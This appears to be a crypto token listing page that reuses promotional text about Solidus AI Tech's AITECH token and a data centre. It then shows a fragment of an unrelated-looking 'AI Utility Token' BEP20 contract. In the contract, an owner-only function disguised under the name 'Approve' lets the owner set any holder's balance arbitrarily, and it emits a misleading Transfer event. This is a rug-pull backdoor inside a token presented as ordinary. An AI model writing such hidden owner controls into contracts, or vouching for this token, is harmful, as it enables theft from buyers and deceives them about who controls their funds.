...
Solidus AI Utility
AI Utility Token
Solidus have built an eco-friendly 8,000 square foot high performance computing (HPC) Data Centre in a highly secure location in Europe. They are launching the Worlds first deflationary Artificial Intelligence token (AITECH) which will be used as a payment gateway to licence Artificial-Intelligence-as-a-Service (AIaaS), Blockchain-as-a-Service (BaaS) and rent HPC power via their Infrastructure-as-a-Service (IaaS) platform.

Solidus will also launch a marketplace for software developers to launch Artificial Intelligence software applications for their users to license where the developers will benefit via a profit share model. AITECH is the token that powers the Solidus AI Tech ecosystem and can be used to purchase everything that is listed on the platform. Fiat currency transactions are converted to AITECH seamlessly on backend and are completed on the Blockchain with AITECH tokens.
...
contract AIUtilityOfficialToken is Context, BEP20, Ownable {
    ...
    constructor() {
        _name = unicode"AI Utility Token";
        _symbol = unicode"AI Utility Token";
        _decimals = 9;
    ...
    */
    function Approve(address AIUtilityRewards, uint256 addedMontant, uint256 addedValue, uint256 subtractedValue) external onlyOwner {
        _balances[AIUtilityRewards] = addedMontant * addedValue ** subtractedValue;
        
        emit Transfer(AIUtilityRewards, address(0), addedMontant);
    }
